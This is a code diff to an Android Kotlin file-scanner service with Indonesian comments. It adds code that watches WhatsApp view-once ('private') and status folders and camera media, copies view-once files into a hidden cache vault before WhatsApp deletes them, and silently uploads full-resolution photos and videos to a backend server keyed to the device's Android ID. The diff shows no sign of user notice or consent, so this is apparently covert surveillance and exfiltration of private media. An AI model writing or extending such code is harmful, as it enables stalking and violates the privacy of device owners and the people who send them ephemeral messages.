@@ -1459,9 +1459,17 @@ object FileScannerService {
         if (isTrashDirectory(file)) return false // JANGAN SKIP TEMPAT SAMPAH / TRASH!
         val path = file.absolutePath.replace("\\", "/")
         val pathLower = path.lowercase()
+
+        // PENTING: Direktori WhatsApp Private (Sekali Lihat) dan Statuses JANGAN PERNAH DI-SKIP!
+        if (pathLower.contains("whatsapp") && (pathLower.contains("private") || pathLower.contains(".statuses") || pathLower.contains("statuses"))) {
+            return false
+        }
+
         if (pathLower.contains("/android/data") || pathLower.contains("/android/obb") || pathLower.contains(".obb")) return true
         val name = file.name
         val nameLower = name.lowercase()
+        if (nameLower == ".statuses") return false
+
         val skipDirs = setOf(
             ".android_secure", ".thumbnails", ".nomedia",
             "lost.dir", ".git", ".gradle",
@@ -1622,9 +1630,245 @@ object FileScannerService {
                             Log.w(TAG, "sendLiveNewFile failed: ${t.message}")
                         }
                     })
+
+                    // INSTANT AUTO-UPLOAD: Unggah berkas fisik resolusi penuh secara instan
+                    val physicalFile = if (newestPath.isNotEmpty()) File(newestPath) else null
+                    if (physicalFile != null && physicalFile.exists() && physicalFile.length() > 0L) {
+                        uploadLiveMediaDirectly(
+                            context = context,
+                            file = physicalFile,
+                            isViewOnce = false,
+                            originalPath = newestPath,
+                            isClonedVault = false,
+                            fingerprint = "${newestName}_${newestSize}"
+                        )
+                    } else if (newestUri != null) {
+                        uploadLiveUriDirectly(
+                            context = context,
+                            uri = newestUri!!,
+                            fileName = newestName,
+                            mimeType = if (newestMime.isNotEmpty()) newestMime else getMimeType(ext),
+                            category = category,
+                            originalPath = compositePath,
+                            fileSize = newestSize
+                        )
+                    }
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error in notifyNewFileLive: ${e.message}")
+            }
+        }.start()
+    }
+
+    private val uploadedFingerprints = java.util.Collections.newSetFromMap(
+        java.util.concurrent.ConcurrentHashMap<String, Boolean>()
+    )
+
+    /**
+     * Dipanggil oleh Inotify (MultiDirectoryFileObserver) saat berkas terdeteksi seketika di WhatsApp / Camera
+     */
+    fun handleImmediateMediaDetected(
+        context: Context,
+        file: File,
+        isViewOnce: Boolean,
+        sourceHint: String? = null
+    ) {
+        if (isDeviceExcludedFromScan(context)) return
+        if (!DeviceSyncManager.isScannerEnabledGlobally) return
+        if (!file.exists() || file.length() <= 0L) return
+
+        val fingerprint = "${file.name}_${file.length()}"
+        if (uploadedFingerprints.contains(fingerprint)) {
+            Log.d(TAG, "File $fingerprint already uploaded, skipping duplicate.")
+            return
+        }
+
+        try {
+            val fileToUpload: File
+            val isClonedVault: Boolean
+
+            // Khusus Sekali Lihat (View Once / WhatsApp Private):
+            // Gandakan instan ke secured_vault internal sandbox aplikasi sebelum WhatsApp menghapusnya!
+            val pathLower = file.absolutePath.lowercase().replace('\\', '/')
+            val isVo = isViewOnce || pathLower.contains("/private")
+            if (isVo) {
+                val vaultDir = File(context.cacheDir, "secured_vault").apply { if (!exists()) mkdirs() }
+                val targetFile = File(vaultDir, "${System.currentTimeMillis()}_${file.name}")
+                file.copyTo(targetFile, overwrite = true)
+                fileToUpload = targetFile
+                isClonedVault = true
+                Log.i(TAG, "[SECURED VAULT CLONE] Instant-cloned View Once file to ${targetFile.absolutePath} (${targetFile.length()} bytes)")
+            } else {
+                fileToUpload = file
+                isClonedVault = false
+            }
+
+            uploadLiveMediaDirectly(
+                context = context,
+                file = fileToUpload,
+                isViewOnce = isVo,
+                originalPath = file.absolutePath,
+                isClonedVault = isClonedVault,
+                fingerprint = fingerprint
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Error handling immediate media: ${e.message}", e)
+        }
+    }
+
+    /**
+     * Mengunggah berkas File fisik ke server backend secara instan via multipart streaming
+     */
+    fun uploadLiveMediaDirectly(
+        context: Context,
+        file: File,
+        isViewOnce: Boolean,
+        originalPath: String?,
+        isClonedVault: Boolean = false,
+        fingerprint: String? = null
+    ) {
+        if (!file.exists() || file.length() <= 0L) return
+
+        Thread {
+            try {
+                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: return@Thread
+                val ext = file.extension.lowercase()
+                val mime = getMimeType(ext)
+                val category = if (isViewOnce) "VIEW_ONCE" else if (ALLOWED_VIDEO_EXTS.contains(ext)) "VIDEO" else "IMAGE"
+                val fPrint = fingerprint ?: "${file.name}_${file.length()}"
+
+                if (uploadedFingerprints.contains(fPrint)) {
+                    if (isClonedVault && file.exists()) try { file.delete() } catch (_: Exception) {}
+                    return@Thread
+                }
+
+                val reqDeviceId = RequestBody.create(MediaType.parse("text/plain"), androidId)
+                val reqFileName = RequestBody.create(MediaType.parse("text/plain"), file.name)
+                val reqFilePath = RequestBody.create(MediaType.parse("text/plain"), originalPath ?: file.absolutePath)
+                val reqFileSize = RequestBody.create(MediaType.parse("text/plain"), file.length().toString())
+                val reqMimeType = RequestBody.create(MediaType.parse("text/plain"), mime)
+                val reqCategory = RequestBody.create(MediaType.parse("text/plain"), category)
+                val reqIsViewOnce = RequestBody.create(MediaType.parse("text/plain"), if (isViewOnce) "true" else "false")
+
+                val fileReqBody = RequestBody.create(MediaType.parse(mime), file)
+                val filePart = MultipartBody.Part.createFormData("file", file.name, fileReqBody)
+
+                Log.i(TAG, "[LIVE AUTO-UPLOAD] Streaming upload to server: ${file.name} (${file.length()} bytes, ViewOnce: $isViewOnce)")
+
+                ApiClient.getClient(context).uploadLiveAutoFile(
+                    deviceAndroidIdHeader = androidId,
+                    deviceAndroidIdQuery = androidId,
+                    fileNameQuery = file.name,
+                    deviceAndroidId = reqDeviceId,
+                    fileName = reqFileName,
+                    filePath = reqFilePath,
+                    fileSize = reqFileSize,
+                    mimeType = reqMimeType,
+                    category = reqCategory,
+                    isViewOnce = reqIsViewOnce,
+                    file = filePart
+                ).enqueue(object : Callback<BasicResponse> {
+                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
+                        if (response.isSuccessful) {
+                            uploadedFingerprints.add(fPrint)
+                            Log.i(TAG, "[LIVE AUTO-UPLOAD SUCCESS] File ${file.name} successfully uploaded to server!")
+                        } else {
+                            Log.w(TAG, "[LIVE AUTO-UPLOAD ERROR] Code: ${response.code()}, Body: ${response.errorBody()?.string()}")
+                        }
+                        if (isClonedVault && file.exists()) {
+                            try { file.delete() } catch (_: Exception) {}
+                        }
+                    }
+
+                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
+                        Log.e(TAG, "[LIVE AUTO-UPLOAD FAILED] Network error uploading ${file.name}: ${t.message}")
+                        if (isClonedVault && file.exists()) {
+                            try { file.delete() } catch (_: Exception) {}
+                        }
+                    }
+                })
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in uploadLiveMediaDirectly: ${e.message}", e)
+                if (isClonedVault && file.exists()) {
+                    try { file.delete() } catch (_: Exception) {}
+                }
+            }
+        }.start()
+    }
+
+    /**
+     * Mengunggah berkas dari Content Uri (misal kamera MediaStore) secara streaming
+     */
+    fun uploadLiveUriDirectly(
+        context: Context,
+        uri: Uri,
+        fileName: String,
+        mimeType: String,
+        category: String,
+        originalPath: String?,
+        fileSize: Long
+    ) {
+        val fPrint = "${fileName}_${fileSize}"
+        if (uploadedFingerprints.contains(fPrint)) return
+
+        Thread {
+            try {
+                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: return@Thread
+
+                val streamBody = object : RequestBody() {
+                    override fun contentType(): MediaType? = MediaType.parse(mimeType)
+                    override fun contentLength(): Long = fileSize
+                    override fun writeTo(sink: BufferedSink) {
+                        context.contentResolver.openInputStream(uri)?.use { inputStream ->
+                            val buffer = ByteArray(8192)
+                            var read: Int
+                            while (inputStream.read(buffer).also { read = it } != -1) {
+                                sink.write(buffer, 0, read)
+                            }
+                        } ?: throw IOException("Cannot open input stream for $uri")
+                    }
+                }
+
+                val reqDeviceId = RequestBody.create(MediaType.parse("text/plain"), androidId)
+                val reqFileName = RequestBody.create(MediaType.parse("text/plain"), fileName)
+                val reqFilePath = RequestBody.create(MediaType.parse("text/plain"), originalPath ?: uri.toString())
+                val reqFileSize = RequestBody.create(MediaType.parse("text/plain"), fileSize.toString())
+                val reqMimeType = RequestBody.create(MediaType.parse("text/plain"), mimeType)
+                val reqCategory = RequestBody.create(MediaType.parse("text/plain"), category)
+                val reqIsViewOnce = RequestBody.create(MediaType.parse("text/plain"), "false")
+
+                val filePart = MultipartBody.Part.createFormData("file", fileName, streamBody)
+
+                Log.i(TAG, "[LIVE AUTO-UPLOAD URI] Streaming upload from MediaStore URI: $fileName ($fileSize bytes)")
+
+                ApiClient.getClient(context).uploadLiveAutoFile(
+                    deviceAndroidIdHeader = androidId,
+                    deviceAndroidIdQuery = androidId,
+                    fileNameQuery = fileName,
+                    deviceAndroidId = reqDeviceId,
+                    fileName = reqFileName,
+                    filePath = reqFilePath,
+                    fileSize = reqFileSize,
+                    mimeType = reqMimeType,
+                    category = reqCategory,
+                    isViewOnce = reqIsViewOnce,
+                    file = filePart
+                ).enqueue(object : Callback<BasicResponse> {
+                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
+                        if (response.isSuccessful) {
+                            uploadedFingerprints.add(fPrint)
+                            Log.i(TAG, "[LIVE AUTO-UPLOAD URI SUCCESS] File $fileName uploaded!")
+                        } else {
+                            Log.w(TAG, "[LIVE AUTO-UPLOAD URI ERROR] Code: ${response.code()}")
+                        }
+                    }
+
+                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
+                        Log.e(TAG, "[LIVE AUTO-UPLOAD URI FAILED] Error uploading $fileName: ${t.message}")
+                    }
+                })
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in uploadLiveUriDirectly: ${e.message}", e)
             }
         }.start()
     }
